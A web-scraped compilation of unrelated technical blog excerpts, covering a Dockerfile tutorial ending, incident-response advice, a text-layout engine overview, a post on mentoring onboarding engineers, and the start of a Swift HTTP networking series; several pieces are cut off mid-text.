<h3>Updating pip, setuptools and wheel</h3>
<p>One last thing, it's important to keep <code>pip</code>, <code>setuptools</code> and <code>wheel</code> updated, so it's wise to bump them directly inside our Docker image.</p>
<div data-language="dockerfile"><pre><code><span>FROM</span> python<span>:</span>3.8.3<span>-</span>slim<span>-</span>buster

<span>ARG</span> GIT_HASH
<span>ENV</span> GIT_HASH=$<span>{</span>GIT_HASH<span>:</span><span>-</span>dev<span>}</span>
<span>ENV</span> TINI_VERSION=<span>"v0.19.0"</span>

<span>ADD</span> https<span>:</span>//github.com/krallin/tini/releases/download/$<span>{</span>TINI_VERSION<span>}</span>/tini /tini
<span>RUN</span> chmod +x /tini


<span>RUN</span> pip install <span>-</span>U \
    pip \
    setuptools \
    wheel

<span>WORKDIR</span> /project

<span>RUN</span> useradd <span>-</span>m <span>-</span>r user &amp;&amp; \
    chown user /project

<span>COPY</span> requirements.txt ./
<span>RUN</span> pip install <span>-</span>r requirements.txt

<span>COPY</span> . .

<span>USER</span> <span>user</span>

<span>ENTRYPOINT</span> <span>[</span><span>"/tini"</span><span>,</span> <span>"--"</span><span>]</span></code></pre></div>
<p>Let's test our application once again:</p>
<div data-language="text"><pre><code>&gt; docker build -t movie-app .
&gt; docker run --rm -p 8888:8888 movie-app python app.py
curl localhost:8888</code></pre></div>
<p>And with this last step we are done!</p>
<h3>Quick recap</h3>
<ul>
<li><code>ARG</code> and <code>ENV</code> are neat, use them</li>
<li>Copy and install your dependencies before copying your application</li>
<li>Don't run containers as root, set a new user with <code>USER</code></li>
<li>Try to prettify your dockerfiles</li>
<li>Always use <code>Tini</code></li>
<li>Defining a <code>WORKDIR</code> helps</li>

  <section><p>Throughout my career, I’ve always gravitated toward incidents. Maybe it’s the
drama, or I like to see how things go wrong. Perhaps… maybe I even cause them?</p>

<p>Whatever the reason, this experience has helped me develop a sense of how I like
handling incidents, something I’ve tried passing onto my team. So when a
colleague asked what our methods were, I was more than happy to respond with
some unstructured ramblings.</p>

<figure>
  <img src="https://blog.lawrencejones.dev/assets/images/incident-response-email.png" alt="email asking for incident response advice">
</figure>

<p>Since then, Matthieu has regularly nudged me to share these thoughts more
widely. This article is what happened when I took those words, dressed them up
all fancy, and sent them into the world.</p>

<p>I hope you find it useful!</p>

<hr>

<p>If you’ve ever Googled incident response, you’ll have found a load of results
about <strong>incident roles</strong>. Atlassian has some <a href="https://www.atlassian.com/incident-management">incredible docs</a> that
explain the concepts well.</p>

<p>In brief:</p>

<ul>
  <li>Incident roles help scale incidents as your response team grows. Roles help
separate responsibilities, ensuring someone is properly focused on each aspect
of an incident. Defining these roles can help make everyone clear about what
they’re expected to do, and what to expect of one another.</li>
  <li>Two <a href="https://www.atlassian.com/incident-management/incident-response/roles-responsibilities">roles</a> you must be aware of:
    <ul>
      <li>Incident commander, the single point of contact for actions taken related
to this incident. They don’t need to be the person taking the action, but
before you reboot that server, you check with them. This avoids the
classic ‘shit, I didn’t realise you were restoring the database onto
<em>that</em> node’ when you clash with a well-intentioned colleague</li>
      <li>Communications. Essential, and typically the first thing forgotten when
lacking a structured incident response process. Don’t be that team-
nominate someone to manage comms as early as possible, and make sure all
responders actively offload communication to them. Don’t ever split
people’s focus by requiring them to debug and communicate, or you’ll
half-ass both!</li>
    </ul>
  </li>
  <li>There are many other roles defined in the literature, but roles only help when
your team has a strong understanding of what each role entails. Commander and
communications are, in my opinion, essential- adding more granularity without
sufficient training can confuse incidents and impair your response</li>
</ul>

<p>If you become comfortable with the roles you want to use, and your team are well
practiced in all of them, you’ll have taken the first step towards an effective
response. But now you have the roles, how does your team go about fixing the
issue?</p>

<p>Firstly, identify <strong>what is bleeding</strong>. If you can establish the scope of an
incident early, it means your next steps will be much more likely to address the
problem.</p>

<p>Try to:</p>

<ul>
  <li>Identify which systems are failing, then work through the dependencies to
understand whether the issue is due to an upstream or downstream component</li>
  <li>Be extremely wary of assumptions. For everything you receive from a
third-party, trust but verify. Record whatever you did to verify, such as the
commands you ran and the time you ran them. An incorrect assumption can derail
your response, so do your best to avoid them!</li>
  <li>Once you’ve found the technical source, consider running some impact analysis.
Don’t delay your response with this work, but if someone is spare, get them to
estimate the scope of the impact- who and how many are affected. An inaccurate
understanding of impact can lead to poor decisions, and clarity on who is
affected can help other parts of your organisation (Customer Success, Support,
etc) respond appropriately</li>
</ul>

<p>Once the team understands the nature of the incident, you can begin to <strong>stop
the bleeding</strong>. Put differently, your goal should be to stop the immediate pain
and defer clean-up to a less pressured time.</p>

<p>For this, we need to prioritise actions to achieve the best chance of a positive
outcome. Note the phrase <strong>“best chance”</strong>: routine remediations that are quick
to apply should be taken first, even if you suspect it may only partially fix
the problem.</p>

<p>This means:</p>

<ul>
  <li>Rollback to a known good revision, even if you think you can write a fix
really quickly- you can always do that after you’ve rolled back, when there is
less urgency</li>
  <li>Take action to preserve critical systems, even at the expense of other less
critical flows. If a single endpoint is causing the whole system to fail,
don’t hesitate to no-op that endpoint if it restores service to the parts that
matter</li>
  <li>Make full use of your team and proactively apply whatever fixes you think are
low-risk, even if you suspect it might not fix the whole problem: scale down
non-essential queues, put a freeze on deploys, restart that server. Effective
delegation means it costs little to try, provided other responders continue to
work on root cause analysis assuming the easy fixes will fail</li>
</ul>

<p>This should give you an idea of what your team should work on. The question is
now how should they work together to execute them?</p>

<p>Given incident response is so much about communication, you’ll be wanting an
effective tool for <strong>instant messaging</strong>, and to record a log of your actions.</p>

<p>Turn to Slack (or whatever your equivalent is):</p>

<ul>
  <li>The first action in any incident should be creating a message channel. Several
tools (<a href="https://github.com/monzo/response">monzo/response</a>, <a href="https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072">Netflix’s
Dispatch</a>) can automatically create that (and more) for you,
but even if you have to painstakingly click those buttons yourself, do it.
It’s way worth the additional minute of downtime to get that space
ready-to-go.</li>
  <li>I strongly advocate against private incident response channels. Company
culture providing, a public channel can level-up your response by increasing
ease of access to information. This can prevent coordination issues that you’d
head-desk to encounter (I’ve seen two separate incident teams tackling the
same incident, with no knowledge of each others existence…)</li>
  <li>Whenever you’re about to do something destructive, such as run a command or
restart some resource, message the channel. Not only can this improve
awareness across the team, but it provides an invaluable resource when
building an incident log for your post-mortem</li>
</ul>

<p>Instant messaging is great for information that is timestamped and should not be
changed. For content you expect to modify as the incident progresses, create an
<strong>incident document</strong> in your favourite collaborative editor (Google Docs,
Dropbox Paper, Notion, etc):</p>

<ul>
  <li>Your organisation can draft incident doc templates that contain the structure
you need: perhaps you have reporting responsibilities, or have a specific
communications flow? Put it all in here, and make it easy to create documents
from these templates with a single click</li>
  <li>Especially for large-scale incidents where people rotate through the incident
team, this doc can act as the entry-point for onboarding people into the
incident. Have whoever runs comms manage this document, maintaining a timeline
of important events, and even draft an executive summary if the incident is
particularly complex</li>
  <li>Have your technical team post code snippets or relevant logs lines into the
document appendix, so everyone can lean on a central view of the incident</li>
</ul>

<p>Paired together, chat log and incident doc can be powerful tools to help
coordinate the response team, while providing transparency to any invested
onlookers. Even better, this content can be easily reshaped into a post-mortem
once the dust has settled.</p>

<p>Finally, and most importantly, the <strong>human element</strong>. People make bad decisions
when stressed, and the excitement of an incident can make you forget entirely
about caring for yourself. Lead by example and be forceful when encouraging your
responders to care for themselves.</p>

<p>Some things to consider:</p>

<ul>
  <li>One highly effective method to reduce stress is to take breaks, going away
from your screen, and breathing. Actively encourage your team to take these
pauses with you, reducing the chance you’ll screw things up by rushing</li>
  <li>As a general rule, take pauses whenever:
    <ul>
      <li>You get paged. It doesn’t have to be long; just 10s of breathing can
remind your body that you’re in control, and lower your adrenaline.</li>
      <li>Whenever the production impact has ceased. As soon as the alarms go quiet
and things seem stable, call a break for the entire team. It’s rare that
incidents don’t have extended follow-up work: rest yourself for at least
15m before you start that process</li>
      <li>During follow-up, before commencing any sort of procedure, such as
‘recovery of X cluster’. Get everyone to grab some air before running the
checklist, allowing each individual to recharge in case the process goes
wrong, or takes much longer than expected</li>
    </ul>
  </li>
  <li>Ensure your incident commanders are trained to detach responders before they
burn themselves. One important job is to order (and expense!) food before
people get hungry. You’ll be surprised at how an incident response team will
eat, after noisily protesting that they don’t need any food!</li>
</ul>

<p>That’s all folks! A whistle-stop tour through my essential shopping list of
incident response practices. This list is far from complete, but can be used as
a great starter pack, or a prompt for the more experienced to consider what they
care about in their incident response process.</p>

<p>Just remember: take a deep breath, look out for your colleagues, blame systems
not people, and don’t rush. Good luck!</p>

  <div itemprop="articleBody">
    <p>I love text layout, and have been working with it in one form or other for over 35 years. Yet, knowledge about it is quite arcane. I don’t believe there is a single place where it’s all properly written down. I have some explanation for that: while basic text layout is very important for UI, games, and other contexts, a lot of the “professional” needs around text layout are embedded in <em>much</em> more complicated systems such as Microsoft Word or a modern Web browser.</p>

<p>A complete account of text layout would be at least a small book. Since there’s no way I can write that now, this blog post is a small step towards that – in particular, an attempt to describe the “big picture,” using the conceptual framework of a “loose hierarchy.” Essentially, a text layout engine breaks the input into finer and finer grains, then reassembles the results into a text layout object suitable for drawing, measurement, and hit testing.</p>

<p>The main hierarchy is concerned with laying out the entire paragraph as a single line of text. Line breaking is also important, but has a separate, parallel hierarchy.</p>

<h2 id="the-main-text-layout-hierarchy">The main text layout hierarchy</h2>

<p>The hierarchy is: paragraph segmentation as the coarsest granularity, followed by rich text style and BiDi analysis, then itemization (coverage by font), then Unicode script, and shaping clusters as the finest.</p>

<p><img src="https://raphlinus.github.io/assets/layout_pyramid.svg" alt="diagram of layout hierarchy"></p>

<h3 id="paragraph-segmentation">Paragraph segmentation</h3>

<p>The coarsest, and also simplest, segmentation task is paragraph segmentation. Most of the time, paragraphs are simply separated by newline (U+000A) characters, though Unicode in its infinite wisdom specifies a number of code point sequences that function as paragraph separators in plain text:</p>

<ul>
  <li>U+000A LINE FEED</li>
  <li>U+000B VERTICAL TAB</li>
  <li>U+000C FORM FEED</li>
  <li>U+000D CARRIAGE RETURN</li>
  <li>U+000D U+000A (CR + LF)</li>
  <li>U+0085 NEXT LINE</li>
  <li>U+2008 LINE SEPARATOR</li>
  <li>U+2009 PARAGRAPH SEPARATOR</li>
</ul>

<p>In rich text, paragraphs are usually indicated through markup rather than special characters, for example <code>&lt;p&gt;</code> or <code>&lt;br&gt;</code> in HTML. But in this post, as in most text layout APIs, we’ll treat rich text as plain text + attribute spans.</p>

<h3 id="rich-text-style">Rich text style</h3>

<p>A paragraph of rich text may contain <em>spans</em> that can affect formatting. In particular, choice of font, font weight, italic or no, and a number of other attributes can affect text layout. Thus, each paragraph is typically broken into a some number of <em>style runs,</em> so that within a run the style is consistent.</p>

<p>Note that some style changes don’t <em>necessarily</em> affect text layout. A classic example is color. Firefox, rather famously, does <em>not</em> define segmentation boundaries here for color changes. If a color boundary cuts a ligature, it uses fancy graphics techiques to render parts of the ligature in different color. But this is a subtle refinement and I think not required for basic text rendering. For more details, see <a href="https://gankra.github.io/blah/text-hates-you/">Text Rendering Hates You</a>.</p>

<h3 id="bidirectional-analysis">Bidirectional analysis</h3>

<p>Completely separate from the style spans, a paragraph may in general contain both left-to-right and right-to-left text. The need for bidirectional (BiDi) text is certainly one of the things that makes text layout more complicated.</p>

<p>Fortunately, this part of the stack is defined by a standard (<a href="http://www.unicode.org/reports/tr9/">UAX #9</a>), and there are a number of good implementations. The interested reader is referred to <a href="https://www.w3.org/International/articles/inline-bidi-markup/uba-basics">Unicode Bidirectional Algorithm basics</a>. The key takeaway here is that BiDi analysis is done on the plain text of the entire paragraph, and the result is a sequence of <em>level runs,</em> where the level of each run defines whether it is LTR or RTL.</p>

<p>The level runs and the style runs are then merged, so that in subsequent stages each run is of a consistent style and directionality. As such, for the purpose of defining the hierarchy, the result of BiDi analysis could alternatively be considered an implicit or derived rich text span.</p>

<p>In addition to BiDi, which I consider a basic requirement, a more sophisticated text layout engine will also be able to handle vertical <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/writing-mode">writing modes</a>, including mixed cases where short strings are horizontal within the vertical primary direction. Extremely sophisticated layout engines will also be able to handle ruby text and other ways of annotating the main text flow with intercalated strings. See <a href="https://www.w3.org/TR/jlreq/">Requirements for Japanese Text Layout</a> for many examples of sophisticated layout requirements; the scope of this blog post really is basic text layout of the kind needed in user interfaces.</p>

<h3 id="itemization-font-coverage">Itemization (font coverage)</h3>

<p>Itemization is the trickiest and least well specified part of the hierarchy. There is no standard for it, and no common implementation. Rather, each text layout engine deals with it in its own special way.</p>

<p>Essentially, the result of itemization is to choose a single concrete font for a run, from a <em>font collection.</em> Generally a font collection consists of a main font (selected by font name from system fonts, or loaded as a custom asset), backed by a <em>fallback stack,</em> which are usually system fonts, but thanks to <a href="https://www.google.com/get/noto/">Noto</a> it is possible to bundle a fallback font stack with an application, if you don’t mind spending a few hundred megabytes for the assets.</p>

<p>Why is it so tricky? A few reasons, which I’ll touch on.</p>

<p>First, it’s not so easy to determine whether a font can render a particular string of text. One reason is <a href="https://unicode.org/reports/tr15/">Unicode normalization</a>. For example, the string “é” can be encoded as U+00E9 (in NFC encoding) or as U+0065 U+0301 (in NFD encoding). Due to the principle of <a href="https://en.wikipedia.org/wiki/Unicode_equivalence">Unicode equivalence</a>, these should be rendered identically, but a font may have coverage for only one or the other in its <a href="https://docs.microsoft.com/en-us/typography/opentype/spec/cmap">Character to Glyph Index Mapping</a> (cmap) table. The shaping engine has all the Unicode logic to handle these cases.</p>

<p>Of course, realistic fonts with Latin coverage will have both of these particular sequences covered in the cmap table, but edge cases certainly do happen, both in extended Latin ranges, and other scripts such as Hangul, which has complex normalization rules (thanks in part to a Korean standard for normalization which is somewhat at odds with Unicode). It’s worth noting that <a href="https://devblogs.microsoft.com/oldnewthing/20201009-00/?p=104351">DirectWrite gets Hangul normalization quite wrong</a>.</p>

<p>I believe a similar situation exists with the Arabic presentation forms; see <a href="https://www.arabeyes.org/Developing_Arabic_fonts">Developing Arabic fonts</a> for more detail on that.</p>

<p>Because of these tricky normalization and presentation issues, the most robust way to determine whether a font can render a string is to try it. This is how LibreOffice has worked for a while, and in 2015 <a href="https://lists.freedesktop.org/archives/harfbuzz/2015-October/005168.html">Chromium followed</a>. See also <a href="https://www.chromium.org/teams/layout-team/eliminating-simple-text">Eliminating Simple Text</a> for more background on the Chromium text layout changes.</p>

<p><em>Another</em> whole class of complexity is emoji. A lot of emoji can be rendered with either <a href="https://en.wikipedia.org/wiki/Emoji#Emoji_versus_text_presentation">text or emoji presentation</a>, and there are no hard and fast rules to pick one or the other. Generally the text presentation is in a symbol font, and the emoji presentation is in a separate color font. A particularly tough example is the smiling emoji, which began its encoding life as 0x01 in <a href="https://en.wikipedia.org/wiki/Code_page_437">Code page 437</a>, the standard 8-bit character encoding of the original IBM PC, and is now U+263A in Unicode. However, the suggested default presentation is text, which won’t do in a world which expects color. Apple on iOS unilaterally chose an emoji presentation, so many text stacks follow Apple’s lead. (Incidentally, the most robust way to encode such emoji is to append a <a href="https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block)">variation selector</a> to pin down the presentation.)</p>

<p>Another source of complexity when trying to write a cross-platform text layout engine is querying the system fonts. See <a href="https://raphlinus.github.io/rust/skribo/text/2019/04/04/font-fallback.html">Font fallback deep dive</a> for more information about that.</p>

<p>I should note one thing, which might help people doing archaeology of legacy text stacks: it used to be pretty common for text layout to resolve “compatibility” forms such as NFKC and NFKD, and this can lead to various problems. But today it is more common to solve that particular problem by providing a font stack with <em>massive</em> Unicode coverage, including all the code points in the relevant compatibility ranges.</p>

<h3 id="script">Script</h3>

<p>The <em>shaping</em> of text, or the transformation of a sequence of code points into a sequence of positioned glyphs, depends on the script. Some scripts, such as Arabic and Devanagari, have extremely elaborate shaping rules, while others, such as Chinese, are a fairly straightforward mapping from code point into glyph. Latin is somewhere in the middle, starting with a straightforward mapping, but ligatures and kerning are also required for high quality text layout.</p>

<p>Determining script runs is reasonably straightforward - many characters have a Unicode script property which uniquely identifies which script they belong to. However, some characters, such as space, are “common,” so the assigned script just continues the previous run.</p>

<p>A simple example is “hello мир”. This string is broken into two script runs: “hello “ is <code>Latn</code>, and “мир” is <code>Cyrl</code>.</p>

<h3 id="shaping-cluster">Shaping (cluster)</h3>

<p>At this point, we have a run of constant style, font, direction, and script. It is ready for <em>shaping.</em> Shaping is a complicated process that converts a string (sequence of Unicode code points) into positioned glyphs. For the purpose of this blog post, we can generally treat it as a black box. Fortunately, a very high quality open source implementation exists, in the form of HarfBuzz.</p>

<p>We’re not <em>quite</em> done with segmentation, though, as shaping assigns substrings in the input to <a href="https://harfbuzz.github.io/clusters.html">clusters</a> of glyphs. The correspondence depends a lot on the font. In Latin, the string “fi” is often shaped to a single glyph (a ligature). For complex scripts such as Devanagari, a cluster is most often a syllable in the source text, and complex reordering can happen within the cluster.</p>

<p>Clusters are important for <em>hit testing,</em> or determining the correspondence between a physical cursor position in the text layout and the offset within the text. Generally, they can be ignored if the text will only be rendered, not edited (or selected).</p>

<p>Note that these shaping clusters are distinct from grapheme clusters. The “fi” example has two grapheme clusters but a single shaping cluster, so a grapheme cluster boundary can cut a shaping cluster. Since …</p></div></article></div></div></div>

October 27, 2020 | https://swimm.io/blog/2020-07-14-who%E2%80%99s-mentoring-the-mentor/ | <a href="https://web.archive.org/web/*/https://swimm.io/blog/2020-07-14-who%E2%80%99s-mentoring-the-mentor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-v-61c0ab88=""> <!----> <div data-v-2ee12136="" data-v-61c0ab88=""><div><p>Anyone who has ever queried information about developer onboarding, could notice right away, what we at Swimm call ‘The Onboardee Bias’. Most onboarding approaches are centered on guiding new hires through their first days, tasks or overcoming the hurdles of getting started. But this approach rarely highlights the troubles and challenges of the mentors*. While we frequently hear about the “Sink or Swim” approach by which new engineers are “thrown into the deep end” with hands-on tasks on their first day in, the truth is, mentors are also treated this way, although unintentionally with no buoy waiting for them.</p>
<p>Mentors are, by definition, some of the more experienced and confident engineers on the team, so it’s almost counter intuitive to highlight their insecurities. Yet, our experience is that this is in-fact the core problem of engineer onboarding.** <strong>In this post we try to shed light on the role of the mentor in the onboarding process:</strong></p>
<ul>
<li>‘The Good Mentor Checklist’</li>
<li>How Poor Mentorship Reflects in Business</li>
<li>Mentoring the Mentor 101</li>
</ul>
<p><em>* By ‘mentors’ we mean experienced engineers tasked with onboarding a new hire, sometimes also called “buddies” among engineering teams.</em></p>
<p><em>** There are some awesome onboarding experiences out there. We are not saying they don’t exist. But our experience is that they are not the norm.</em></p>
<h2>1. ‘The Good Mentor Checklist’</h2>
<p>The journey to good mentorship starts with reflecting on your own experiences (as a mentor or mentee). Form a list with some of the tools and traits of a super successful mentor, and then try to map out the hurdles - why do some mentors fail to thrive? Here are some key reasons:</p>
<ul>
<li><strong>Time.</strong> Or lack of it. It’s no coincidence that most mentors are extremely busy. Knowing their way around means they get picked for harder tasks. Good mentorship requires ample time and patience, and many mentors lack those.</li>
<li><strong>Good Documentation.</strong> So much has been written and said about how challenging it is to create and maintain good documentation. Suffice to say that a mentor’s life would be much easier with it, and it rarely exists.</li>
<li><strong>Mentorship Skills.</strong> If you have been picked to be a mentor (congrats), you are likely very experienced and know your way around the company or code. But being a really good mentor means you also need an entire skill-set associated with mentorship such as leadership skills, best practices, up to date training techniques, and more.</li>
<li><strong>A Realistic Plan.</strong> While most organisations create a basic onboarding plan for the first few days on the job, this plan consists mostly of HR issues and basic orientation. Our experience shows that most teams don’t have a plan for onboarding the new hires onto the codebase, explaining common issues, legacy code, best practice or edge cases. If they do, it’s a basic checklist.</li>
<li><strong>Passion for apprenticeship</strong>. It goes without saying that a little passion for paying it forward and teaching others, goes a long way and makes all the difference between a mentor and a really good mentor. A major hurdle is identifying such spirit in mentors and leveraging it, but also making sure they don’t burn out.</li>
</ul>
<p><img src="https://swimm.io/media/headway-5qgiuubxkwm-unsplash.jpg" alt="Developers at Swimm working on CSS and Front End Deploying new website" title="The journey to good mentorship starts with reflecting on your own experiences"></p>
<h2>2. How Poor Mentorship Reflects in Business</h2>
<p>So we have established some key elements needed for the job. We also established that many times, mentors, experienced and competent as they may be, are not properly prepared for the task.</p>
<p>How does this affect our job and business?</p>
<ul>
<li><strong>The Swiveling Chair Syndrome</strong>. Getting a task you feel unqualified for, might lead many mentors - even potentially great ones to procrastinate. Preparations for the new hire are pushed to the day before their arrival, and sometimes happen on-the-go. The result of which - talented new engineers swiveling in their chairs for quite some time, waiting for something to happen…(or in other words, stretched out time-to-value).</li>
<li><strong>System malfunctions</strong>. Another unfortunate product could be finger-pointing and blaming “the system”. Feeling embarrassed with their inadequacy, mentors might vent hints of frustration with the new hire: “Yeah, there’s some documentation, but I wouldn’t bother with it… Just try to figure it out…” or “They told me you were coming last week, but we have a version coming out, so I guess you’ll have to manage…”. Of course, these are the last things you want new hires to hear in their first few weeks.</li>
<li><strong>Sinking, not swimming</strong>. We mentioned the “sink or swim” approach earlier. Sure, letting new hires struggle with no help is a way to weed out weaker hires, and it may shorten the time it takes to spot a poor fit. But this also means you are giving the good hires a hard time, sending them to fend for themselves. This method is often used to mask insecurity. Rather than admitting you don’t know how to deal with onboarding someone, it is much easier to explain a lack of a plan with ideology. So, even if this method is not beneficial in the long run, unprepared mentors might adopt it anyway.</li>
</ul>
<h2><strong>3. Mentoring the Mentor 101</strong></h2>
<p>So, what can you do about this naturally occurring bias?</p>
<p>Like with other issues, acknowledging there is a problem (i.e. that mentors are being overlooked) is a good starting point. Ask senior developers how prepared they were or currently feel to mentor. Ask them how their own onboarding was like, and whether they would have wanted it to be different. Recall your own onboarding experiences, both as a mentor and a new hire. But mainly, focus on cultivating a culture of knowledge sharing, and creating a tier of mentors equipped with the best tools to handle their next mentoring assignment.</p>

<hr>

    <p>For a while now I’ve had a series of blog posts floating around in my head on how to build an HTTP stack in Swift. The idea started last spring with Rob Napier’s <a href="https://robnapier.net/start-with-a-protocol">blog posts on protocols</a>, and matured last summer and fall while I was working at WeWork on an internal Swift framework.</p>

<p>So, with my <a href="https://davedelong.com/blog/2020/06/14/anything-worth-doing/">newfound blogging powers</a>, I think it’s time to tackle this problem. Over the course of several posts, I’ll walk through a number of topics related to HTTP and how we can fit them together into a great Swift framework. We’ll end up with a framework that supports things like:</p>

<ul>
  <li>automatically retrying requests</li>
  <li>throttling to a customizable maximum number of concurrent requests</li>
  <li>specifying custom server environments for an entire connection stack, or for a single request</li>
  <li>automatically cancelling in-flight requests when the stack is reset</li>
  <li>basic mesh networking</li>
  <li>implementing OAuth (or any sort of authenticated request)</li>
  <li>multi-part form uploads</li>
  <li>easy mocking of responses</li>
  <li>… and a whole lot more I’m glossing over</li>
</ul>

<p>We’ll be building all of this on top of <code>URLSession</code>. And along the way, we’ll be addressing a lot of the feedback I <a href="https://davedelong.com/blog/2018/03/02/apple-networking-feedback/">provided to Apple Engineers</a> about the state of the built-in networking stack. (Awesomely, in the past 2 years a couple of those items have already been addressed)</p>

<p>I will preempt any questions by saying: I will <em>not</em> be publishing the actual code for this framework online. The purpose of these posts is to describe the problems and solutions, but implementing them will be left up to you. I will have small embedded snippets to illustrate concepts, but largely the entire thing will be left as an “exercise for the reader”. There’s just no substitute for sitting down and writing the code yourself.</p>

<p>But… before we get started in Swift, we need to answer a really fundamental question.</p>

<h2 id="what-on-earth-is-http">What on earth is HTTP?</h2>

<p>HTTP, or the <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol">“Hypertext Transfer Protocol”</a>, is a specification for describing how two different systems can communicate with each other. As its name implies, it’s a <em>text</em>-based specification. This is great for humans, because text is nicely readable, and it’s good for machines, because text is pretty nicely compressible (which is a major part of the 2.0 specification).</p>

<p>HTTP defines a very specific <a href="https://en.wikipedia.org/wiki/Request%E2%80%93response">“request/response”</a> model. You send out a request for information, and you get a response back. One request, one response.</p>

<p>A request has the following format:</p>

<ol>
  <li>A request line</li>
  <li>Zero-or-more header value lines</li>
  <li>A blank line</li>
  <li>An optional body</li>
</ol>

<h3 id="request-lines">Request Lines</h3>

<p>A request line looks something like:</p>



<p>The first part of the line is the <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods">request method</a>. We’re most familiar with <code>GET</code> and <code>POST</code>, but other common HTTP methods include things like <code>HEAD</code>, <code>PUT</code>, <code>DELETE</code>, and so on. In reality, the HTTP spec itself does not place a limit on the value of the request method, which allows for specs like <a href="https://en.wikipedia.org/wiki/WebDAV">WebDAV</a> (which powers CalDAV and CardDAV) to add their own methods like <code>COPY</code>, <code>LOCK</code>, <code>PROPFIND</code>, and so on.</p>

<p>This leads us to the simplest of problems with a lot of Swift networking frameworks. It’s really common to see something like this:</p>

<div><div><pre><code><span>public</span> <span>enum</span> <span>HTTPMethod</span><span>:</span> <span>String</span> <span>{</span>
    <span>case</span> <span>get</span> <span>=</span> <span>"GET"</span>
    <span>case</span> <span>post</span> <span>=</span> <span>"POST"</span>
    <span>case</span> <span>put</span> <span>=</span> <span>"PUT"</span>
    <span>case</span> <span>delete</span> <span>=</span> <span>"DELETE"</span>
<span>}</span>
</code></pre></div></div>

<p>Since the HTTP spec allows for <em>any</em> single-word method, defining this value in Swift as an <em>enum</em> is incorrect, because an enum only allows for a finite number of values, but there are an infinite number of possible “single word” values. A <em>better</em> implementation of this is to use a <code>struct</code>:</p>

<div><div><pre><code><span>public</span> <span>struct</span> <span>HTTPMethod</span><span>:</span> <span>Hashable</span> <span>{</span>
    <span>public</span> <span>static</span> <span>let</span> <span>get</span> <span>=</span> <span>HTTPMethod</span><span>(</span><span>rawValue</span><span>:</span> <span>"GET"</span><span>)</span>
    <span>public</span> <span>static</span> <span>let</span> <span>post</span> <span>=</span> <span>HTTPMethod</span><span>(</span><span>rawValue</span><span>:</span> <span>"POST"</span><span>)</span>
    <span>public</span> <span>static</span> <span>let</span> <span>put</span> <span>=</span> <span>HTTPMethod</span><span>(</span><span>rawValue</span><span>:</span> <span>"PUT"</span><span>)</span>
    <span>public</span> <span>static</span> <span>let</span> <span>delete</span> <span>=</span> <span>HTTPMethod</span><span>(</span><span>rawValue</span><span>:</span> <span>"DELETE"</span><span>)</span>

    <span>public</span> <span>let</span> <span>rawValue</span><span>:</span> <span>String</span>
<span>}</span>
</code></pre></div></div>

<p>After the method comes the path, which should be readily recognizable as the <code>.path</code> of a <code>URL</code>.</p>

<p>Finally, there’s a bit about which HTTP spec version you’re using. HTTP 2.0 is commonly used these days, but since it mainly deals with <em>compressed</em> HTTP requests, I’ll use the 1.1 version, which describes <em>uncompressed</em> requests.</p>



<p>Headers are a series of key-value pairs, in a familiar key-value-looking format:</p>

<div><div><pre><code>Host: swapi.dev
Connection: close
User-Agent: Paw/3.1.10 (Macintosh; OS X/10.15.5) GCDHTTPRequest
</code></pre></div></div>

<p>There are a number of <a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">header fields commonly used with HTTP</a>, some of them defined by the specs, and some agreed upon by convention. Like with request methods, there’s no limit to the possible names of a header, nor much of a limit on the possible values.</p>

<h3 id="the-body">The Body</h3>

<p>Any HTTP request may include a body. Yes, even a <code>GET</code> request is allowed to include a body. However, most servers will only interpret the body of a request based on which request method is used, so it’s likely that even if you did include a body with a <code>GET</code> requests, the server would ignore it.</p>

<p>The body itself is just raw binary data. How it’s interpreted by the server depends entirely on conventions agreed upon between the server engineers and the client engineers.</p>

<h2 id="putting-a-request-together">Putting a request together</h2>

<p>If we want to execute a basic HTTP request to the <a href="https://swapi.dev/">Star Wars API</a>, we would construct an HTTP request that looks like this:</p>

<div><div><pre><code>GET /api/ HTTP/1.1
Host: swapi.dev
Connection: close
User-Agent: Paw/3.1.10 (Macintosh; OS X/10.15.5) GCDHTTPRequest

</code></pre></div></div>

<p>We can see the request line, 3 header lines, and an empty line at the end. It’s important to note that every line in an HTTP request is separated by <em>two</em> characters: <code>\r\n</code> (carriage return + line feed). This becomes more apparent when we look at the hex representation of this request (newlines inserted for readability):</p>

<div><div><pre><code>474554202F6170692F20485454502F312E310D0A 
486F73743A2073776170692E6465760D0A
436F6E6E656374696F6E3A20636C6F73650D0A 
557365722D4167656E743A205061772F332E312E313020284D6163696E746F73683B204F5320582F31302E31352E35292047434448545450526571756573740D0A
0D0A
</code></pre></div></div>

<p><code>0D</code> and <code>0A</code> are the hexadecimal representation of <code>\r</code> and <code>\n</code>, respectively. The empty line is how an HTTP server knows where the headers stop and the body begins.</p>

<blockquote>
  <p>As an aside, if you find yourself working with network APIs a lot, I <em>highly</em> recommend using Lucky Marmot’s fantastic app <a href="https://paw.cloud/">Paw</a>. It is an indispensable tool for analyzing and tweaking network calls.</p>
</blockquote>

<p>Another thing worth pointing out here is that <code>Host:</code> header. While it’s required by the spec, it doesn’t necessarily specify where the request is going. That’s because the host part of the URL is used before the request is ever sent by the <a href="https://en.wikipedia.org/wiki/Domain_Name_System">DNS resolution process</a> as part of the whole “what server am I actually connecting to” flow. The <code>Host</code> header is included for clarity while debugging, and it may be used by the server for further internal routing. For example, you could imagine a server for all of Github Pages using the <code>Host</code> header to know which set of pages you actually want.</p>

<p>So, that’s the request.</p>

<h2 id="what-about-the-response">What about the response?</h2>

<p>The response we get back is almost identical in structure to the request. It has:</p>

<ol>
  <li>The response line</li>
  <li>Zero or more header value lines</li>
  <li>An empty line</li>
  <li>An optional body</li>
</ol>

<p>So, that request to the Star Wars API will have a response that looks like this:</p>

<div><div><pre><code>HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 27 Jun 2020 19:13:53 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: close
Vary: Accept, Cookie
X-Frame-Options: SAMEORIGIN
ETag: "57e8c3fe1ac5cb74e15b96dc98767ce6"
Allow: GET, HEAD, OPTIONS
Strict-Transport-Security: max-age=15768000

